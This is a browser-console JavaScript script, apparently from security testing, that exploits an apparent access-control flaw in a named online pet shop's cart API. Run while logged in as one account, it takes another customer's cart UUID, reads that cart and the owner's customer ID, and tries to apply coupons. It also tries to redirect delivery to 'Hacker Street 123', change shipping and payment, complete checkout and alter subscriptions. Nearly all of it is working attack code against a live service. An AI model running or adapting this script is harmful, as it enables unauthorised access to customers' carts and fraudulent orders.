// Test Higher Impact Scenarios
// Execute in browser console while logged in as Account B

const CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50"; // Account A's cart UUID

(async function () {
  console.log("[*] ========================================");
  console.log("[*] TESTING HIGHER IMPACT SCENARIOS");
  console.log("[*] ========================================");

  // Get cart state
  const cart = await fetch(
    `https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`,
    { credentials: "include" }
  ).then((r) => r.json());

  console.log(`[+] Target Cart: ${cart.articles.length} items, ${cart.summary.grandTotal} EUR`);
  console.log(`[+] Cart Owner: customerId ${cart.customerId}`);

  const tests = [
    // Test 1: Apply coupon
    {
      name: "Apply Coupon",
      url: `https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}/coupon`,
      method: "POST",
      body: JSON.stringify({ couponCode: "TEST10" }),
    },
    // Test 2: Change delivery address
    {
      name: "Modify Delivery Address",
      url: `https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}/delivery-address`,
      method: "PUT",
      body: JSON.stringify({
        street: "Hacker Street 123",
        city: "Berlin",
        zipCode: "10115",
        country: "DE",
      }),
    },
    // Test 3: Change shipping method
    {
      name: "Modify Shipping Method",
      url: `https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}/shipping`,
      method: "PUT",
      body: JSON.stringify({ shippingTypeId: 1 }),
    },
    // Test 4: Complete order (if possible)
    {
      name: "Complete Order",
      url: `https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}/checkout`,
      method: "POST",
      body: JSON.stringify({ paymentMethod: "credit_card" }),
    },
    // Test 5: Modify payment method
    {
      name: "Modify Payment Method",
      url: `https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}/payment`,
      method: "PUT",
      body: JSON.stringify({ paymentMethodId: 1 }),
    },
    // Test 6: Modify autoshipment/subscription
    {
      name: "Modify Autoshipment",
      url: `https://www.zooplus.de/semiprotected/api/checkout/state-api/v2/set-autoshipment`,
      method: "PUT",
      body: JSON.stringify({ enabled: true, interval: 2 }),
    },
  ];

  for (const test of tests) {
    console.log(`\n[*] Testing: ${test.name}`);
    try {
      const response = await fetch(test.url, {
        method: test.method,
        credentials: "include",
        headers: {
          "Content-Type": "application/json",
          Accept: "application/json",
        },
        body: test.body,
      });

      const text = await response.text();
      console.log(`    Status: ${response.status}`);
      
      if (response.status === 200 || response.status === 201) {
        try {
          const json = JSON.parse(text);
          console.log(`    [!!!] SUCCESS - ${test.name} works!`);
          console.log(`    Response:`, JSON.stringify(json, null, 2).substring(0, 300));
        } catch (e) {
          console.log(`    Response: ${text.substring(0, 300)}`);
        }
      } else if (response.status === 403) {
        console.log(`    [*] Protected (403) - Good, but endpoint exists`);
      } else if (response.status === 404) {
        console.log(`    [*] Not found (404) - Endpoint doesn't exist`);
      } else {
        console.log(`    Response: ${text.substring(0, 200)}`);
      }
    } catch (e) {
      console.log(`    Error: ${e.message}`);
    }
  }

  console.log("\n[*] ========================================");
  console.log("[*] HIGHER IMPACT TESTING COMPLETE");
  console.log("[*] ========================================");
})();





